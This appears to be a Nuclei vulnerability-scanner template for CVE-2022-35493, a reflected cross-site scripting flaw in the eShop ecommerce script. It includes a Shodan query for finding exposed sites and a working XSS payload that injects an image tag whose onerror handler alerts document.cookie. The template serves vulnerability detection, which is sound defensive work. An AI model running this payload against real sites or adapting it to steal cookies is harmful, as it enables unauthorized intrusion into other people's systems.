id: CVE-2022-35493

info:
  name: eShop - Cross-site Scripting
  author: arafatansari
  severity: medium
  description: |
    eShop - Multipurpose Ecommerce Store Website v3.0.4 allows Reflected Cross-site scripting vulnerability in json search parse and the json response in wrteam.in.
  reference:
    - https://github.com/Keyvanhardani/Exploit-eShop-Multipurpose-Ecommerce-Store-Website-3.0.4-Cross-Site-Scripting-XSS/blob/main/README.md
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35493
  metadata:
    shodan-query: http.html:"eShop - Multipurpose Ecommerce"
    verified: "true"
  tags: xss,cve,2022

requests:
  - method: GET
    path:
      - '{{BaseURL}}/home/get_products?search=%22%3E%3CIMG%20SRC%3Dindex.php%20onerror%3Dalert(document.cookie)%3E'

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - '"><IMG SRC=index.php onerror=alert(document.cookie)>'
        condition: and
